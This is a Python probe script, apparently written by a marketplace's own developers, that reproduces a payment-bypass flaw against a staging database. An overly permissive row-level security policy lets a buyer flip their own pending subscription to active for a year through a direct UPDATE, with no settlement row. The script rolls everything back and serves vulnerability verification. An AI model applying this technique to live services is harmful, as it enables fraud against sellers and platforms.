"""Reproduce: can a buyer grant themselves a marketplace entitlement for free, via a
direct PostgREST UPDATE on their own `library_subscriptions` row, bypassing payment
entirely?

`library_subscriptions` RLS: policy "lib_subs_owner_access" is `FOR ALL` with
`USING (auth.uid() = user_id)` AND `WITH CHECK (auth.uid() = user_id)` -- the buyer's own
identity is the ONLY predicate on INSERT/UPDATE/DELETE. Nothing stops the buyer writing
`status='active'` with a far-future `period_expiry` themselves.

The one thing that could still block it is `chk_ls_active_has_period` (status<>'active' OR
period dates set) and `chk_ls_split_conserved` (owner_share+platform_fee=price_minor) --
both satisfiable by the attacker since they control every column in the same statement.

This probe: seed a PENDING subscription as buyer B (as checkout_service does, pre-payment).
Then, as buyer B via direct RLS, attempt to flip it to ACTIVE with a one-year expiry and a
self-consistent split -- with NO corresponding `marketplace_settlements` row, i.e. no
money ever moved. Report whether `deployment_permissions`/entitlement would then read this
subscription as entitling.

Rolled back unconditionally; no data is left behind.
"""
from __future__ import annotations

import sys
import uuid
from datetime import datetime, timedelta, timezone

import psycopg2

sys.path.insert(0, "staging")
from dsn import resolve_dsn  # noqa: E402


def main() -> int:
    conn = psycopg2.connect(resolve_dsn())
    conn.autocommit = False
    author = str(uuid.uuid4())
    buyer = str(uuid.uuid4())

    try:
        with conn.cursor() as cur:
            for ident, label in ((author, "author"), (buyer, "buyer")):
                cur.execute(
                    "INSERT INTO auth.users (id, email) VALUES (%s, %s)",
                    (ident, f"selfactivate-{label}-{ident[:8]}@example.invalid"),
                )
                cur.execute("INSERT INTO public.profiles (id) VALUES (%s)", (ident,))

            cur.execute(
                "INSERT INTO public.library_strategies "
                "(author_id, source_strategy_id, name, category, symbol, timeframe, "
                " exchange_id, moderation_status, is_active, price_minor, currency) "
                "VALUES (%s, %s, 'probe-listing', 'trend', 'BTC/USDT', '1h', 'binance', "
                "        'approved', true, 2999, 'USD') RETURNING id",
                (author, str(uuid.uuid4())),
            )
            listing_id = cur.fetchone()[0]

            # A PENDING row, exactly what checkout_service._persist_pending writes BEFORE
            # any provider session or payment -- note NO period_start/period_expiry.
            cur.execute(
                "INSERT INTO public.library_subscriptions "
                "(library_id, user_id, status, subscription_tier, "
                " price_minor, currency) "
                "VALUES (%s, %s, 'pending', 'pro', 2999, 'USD') RETURNING id",
                (listing_id, buyer),
            )
            sub_id = cur.fetchone()[0]
            print(f"seeded PENDING subscription {sub_id} for buyer {buyer[:8]} "
                  f"(no payment made, no settlement row exists)")

            # Confirm no settlement exists -- this IS the "no payment ever happened" check.
            cur.execute(
                "SELECT count(*) FROM public.marketplace_settlements WHERE subscription_id=%s",
                (sub_id,),
            )
            print(f"marketplace_settlements rows for this subscription: {cur.fetchone()[0]}")

            cur.execute("SELECT set_config('request.jwt.claim.sub', %s, true)", (buyer,))
            cur.execute("SET LOCAL ROLE authenticated")

            now = datetime.now(timezone.utc)
            expiry = now + timedelta(days=365)
            cur.execute("SAVEPOINT attempt")
            try:
                cur.execute(
                    "UPDATE public.library_subscriptions SET "
                    "  status = 'active', "
                    "  period_start = %s, "
                    "  period_expiry = %s, "
                    "  owner_share_minor = 2699, "
                    "  platform_fee_minor = 300 "
                    "WHERE id = %s",
                    (now, expiry, sub_id),
                )
                print(f"UPDATE statement affected {cur.rowcount} row(s)")
                succeeded = True
                cur.execute("RELEASE SAVEPOINT attempt")
            except psycopg2.Error as exc:
                cur.execute("ROLLBACK TO SAVEPOINT attempt")
                print(f"UPDATE REFUSED: {exc.pgcode} {str(exc).splitlines()[0]}")
                succeeded = False

            cur.execute("RESET ROLE")
            cur.execute(
                "SELECT status, period_expiry FROM public.library_subscriptions "
                "WHERE id = %s",
                (sub_id,),
            )
            row = cur.fetchone()
            print(f"result: status={row[0]!r} period_expiry={row[1]}")

            if succeeded and row[0] == "active":
                print()
                print("CONFIRMED: a buyer can self-activate their own PENDING subscription "
                      "-- a full year of entitlement -- via a direct PostgREST UPDATE, with "
                      "ZERO marketplace_settlements rows, i.e. with NO payment ever having "
                      "been made. deployment_permissions / entitlement_resolver would read "
                      "this row as a paid, active, entitling subscription.")
                verdict = 1
            else:
                print("NOT reproduced -- a database constraint or RLS blocked it")
                verdict = 0
    finally:
        conn.rollback()
        conn.close()
    return verdict


if __name__ == "__main__":
    sys.exit(main())
